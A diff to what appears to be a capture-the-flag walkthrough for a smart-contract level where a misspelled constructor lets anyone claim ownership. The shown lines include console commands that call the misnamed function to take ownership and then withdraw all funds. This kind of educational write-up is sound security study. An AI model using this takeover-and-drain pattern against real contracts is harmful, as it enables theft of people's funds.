@@ -39,7 +39,7 @@ await contract.withdraw() // take all the funds out from the contract!!!
 
 The constructor has typo: Fal”1”out. Since the wrong spelling, it is served as a function rather than a constructor, so everyone can call it and take the ownership.
 
-### Detailed Steps
+### Detailed Steps (work through the console)
 
 ```js
 await contract.Fal1out() // call the wrong-spelled function to take ownership
